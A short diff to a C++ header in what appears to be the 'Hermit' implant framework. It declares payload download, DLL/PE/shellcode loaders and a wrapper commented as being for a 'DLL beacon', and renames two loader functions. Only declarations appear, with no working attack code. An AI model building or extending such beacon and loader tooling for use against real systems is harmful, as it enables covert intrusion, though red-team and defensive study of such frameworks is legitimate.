@@ -13,16 +13,18 @@
 #include "core/technique.hpp"
 #include "core/utils.hpp"
 
-extern "C" ULONG_PTR GetRIP(VOID);
-extern "C" ULONG_PTR Leave(VOID);
+#define DLL_QUERY_HMODULE 6
+
+// This is used for a DLL beacon.
+DWORD WINAPI RunWrapper(LPVOID lpParam);
 
 namespace Hermit
 {
     State::PSTATE Init();
     std::vector<BYTE> Download(State::PSTATE pState);
 
-    VOID DLLLoader();
-    VOID PELoader();
+    VOID DllLoader();
+    VOID PeLoader();
     VOID ShellcodeLoader();
 }
 
